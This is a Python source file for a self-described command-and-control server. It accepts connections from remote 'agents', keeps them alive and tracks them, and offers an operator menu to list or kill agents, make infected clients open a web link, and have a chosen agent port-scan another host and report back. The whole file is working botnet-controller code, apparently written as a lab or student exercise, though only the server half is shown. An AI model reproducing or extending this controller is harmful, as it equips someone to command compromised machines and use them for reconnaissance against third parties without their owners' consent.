import socket
import threading, time
import json


class bcolors:              # colors for prints
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

ip_address = '127.0.0.1'

with open("configuration.json") as json_file:        #get the information from configuration.json
    data = json.load(json_file)

if data['port'] :
    port_number=data['port']
else:
    port_number = 3000

if data['katime']:
    katime=data['katime']
else:
    katime=2

thread_index = 0
THREADS = []
clientmap = {}


def handle_connection(connection, address, thread_index):         #keep alive checker to each client
    global THREADS
    global stop_thread
    last_keep_alive = time.time()
    while True:
        data = connection.recv(16)
        if time.time() - last_keep_alive > 3*katime:
            print("closing connection due to inactivity")
            break
        if data:
            msg = data.decode().strip()
            # Check if the data is the "keep alive" message
            if msg == "keep alive":
                last_keep_alive = time.time()
            elif msg == 'quit' or msg == '':
                break
            else:
                print("received data:", data.decode())
        else:
            break

    #while msg!='quit' and msg!="":
        #print(msg)
        #connection.send(msg.encode())
        #msg = connection.recv(1024).decode()
    print("connection with {} is lost".format(THREADS[thread_index].name))
    THREADS.remove(threading.current_thread())
    close_connection(connection)


def close_connection(connection): #close connection function
    connection.close()

def init_server():           #initialize the server
    global clientmap
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((ip_address, port_number))
    server_socket.listen(5)
    print("Server is up")
    while True:
        connection, address = server_socket.accept()
        thread_index=len(THREADS)
        t = threading.Thread(target=handle_connection, args=(connection, address,len(THREADS)))
        clientmap[t]=connection
        #print("Got new connection {}".format(t.name))
        THREADS.append(t)
        t.start()

def returnAllAgents():      #function that return all the active agents
    mythreads = threading.enumerate()
    curr_threads = []
    for t in THREADS:
        if t in mythreads:
            curr_threads.append(t)
    if not curr_threads:
        print("Don't have any agents at the moment")
    else:
        print(bcolors.ENDC)
        for agent in curr_threads:
            print(agent)
    time.sleep(1)
    input(bcolors.OKBLUE+"send anything to back to mainpage\n\n\n")
    main_page()


def killAgent():       #function that kills one/all active agets
    global clientmap
    mythreads = threading.enumerate()
    curr_threads = []
    for t in THREADS:
        if t in mythreads:
            curr_threads.append(t)
    if not curr_threads:
        print("Don't have any agents at the moment")
    else:
        print("Please send the number indicated on the left to the selected thread.")
        print(bcolors.ENDC+"to kill all the active threads send - \'all\'")
        print(bcolors.ENDC)
        for i in range(len(curr_threads)):
            print(i,"  :   ",curr_threads[i])
        typedvalue = input()
        if typedvalue == 'all':
            for closingthread in curr_threads:
                closing_connection = clientmap.get(closingthread)
                msg = 'quit'
                closing_connection.send(msg.encode())
                close_connection(closing_connection)
                time.sleep(1)
                print("\n" * 20)
        elif 0 <= int(typedvalue) < len(curr_threads):
            closingthread = curr_threads[int(typedvalue)]
            closing_connection = clientmap.get(closingthread)
            msg = 'quit'
            closing_connection.send(msg.encode())
            close_connection(closing_connection)
            time.sleep(1)
            print("\n" * 20)
        else:
            print("\n\nunauthorized value has been sent.\n")
    print("Redirecting to main menu ..\n")
    main_page()


def openweblink():       #function that opens a weblink in the client pc
    global clientmap
    mythreads = threading.enumerate()
    curr_threads = []
    for t in THREADS:
        if t in mythreads:
            curr_threads.append(t)
    if not curr_threads:
        print("Don't have any agents at the moment")
    else:
        print("Please send the number indicated on the left to the selected thread.")
        print(bcolors.ENDC + "to send to all the active threads send - \'all\'")
        for i in range(len(curr_threads)):
            print(i,"  :   ",curr_threads[i])
        typedvalue = input()
        if typedvalue == 'all':
            msg = input("Type the link: without \'http://\'\n")
            msg = "3:" + msg
            for thread in curr_threads:
                thread_connection = clientmap.get(thread)
                thread_connection.send(msg.encode())
        elif typedvalue.isnumeric():
            if 0 <= int(typedvalue) < len(curr_threads):
                thread = curr_threads[int(typedvalue)]
                thread_connection = clientmap.get(thread)
                msg = input("Type the link: without \'http://\'\n")
                msg = "3:" + msg
                thread_connection.send(msg.encode())
            else:
                print("\n\nunauthorized value has been sent.\n")
        else:
            print("\n\nunauthorized value has been sent.\n")
    print("Redirecting to main menu ..\n")
    main_page()


def validate_ip(s):           #checking if ip is in valid
    a = s.split('.')
    if len(a) != 4:
        return False
    for x in a:
        if not x.isdigit():
            return False
        i = int(x)
        if i < 0 or i > 255:
            return False
    return True


def portscantouser():      #runs a port scan in the user pc
    global clientmap
    mythreads = threading.enumerate()
    curr_threads = []
    for t in THREADS:
        if t in mythreads:
            curr_threads.append(t)
    if not curr_threads:
        print("Don't have any agents at the moment")
    else:
        print("Please send the number indicated on the left to the selected thread.")
        for i in range(len(curr_threads)):
            print(i,"  :   ",curr_threads[i])
        typedvalue = input()
        if typedvalue.isnumeric():
            if 0 <= int(typedvalue) < len(curr_threads):
                remote_server = input("Enter a valid remote host to scan: ")
                if validate_ip(remote_server):
                    msg = "4:"+remote_server
                    thread = curr_threads[int(typedvalue)]
                    thread_connection = clientmap.get(thread)
                    thread_connection.send(msg.encode())
                    msg = thread_connection.recv(2048).decode()
                    print("\n\n"+"_"*50)
                    print(msg)
                    print("_"*50+"\n\n")
                    msg="ok"
                    time.sleep(2)
                    thread_connection.send(msg.encode())
                    time.sleep(2)
                    endmessage = ""
                    while True:
                        time.sleep(0.5)
                        msg = thread_connection.recv(2048).decode()
                        if msg == "keep alive":
                            pass
                        elif msg != "keep alive" and msg != "":
                            endmessage=msg
                            print(endmessage)
                            break
                        if not msg:
                            break
                        print(msg)
                else:
                    print(bcolors.WARNING+"Not a valid ipv4 input")
            else:
                print("\n\nunauthorized value has been sent.\n")
        else:
            print("\n\nunauthorized value has been sent.\n")
    print(bcolors.ENDC+"Redirecting to main menu ..\n")
    main_page()

def main_page():      #main function that send you to all the other functions
    print(bcolors.HEADER+"Welcome to the C&C server:\nsend one of the following numbers:"+bcolors.OKCYAN)
    print("1 - to check all the active agents")
    print("2 - to kill one/all active agents")
    print("3 - open a website in one/all clients")
    print("4 - run a port scan to a user")
    userInput=input()
    print(bcolors.OKGREEN)
    if userInput == '1':
        returnAllAgents()
    elif userInput == '2':
        killAgent()
    elif userInput == '3':
        openweblink()
    elif userInput == '4':
        portscantouser()
    else:
        print("unauthorized value, please type existing value\n\n\n")
        main_page()


if __name__ == "__main__":
    s1 = threading.Thread(target=init_server)
    s1.start()
    time.sleep(1)
    main_page()
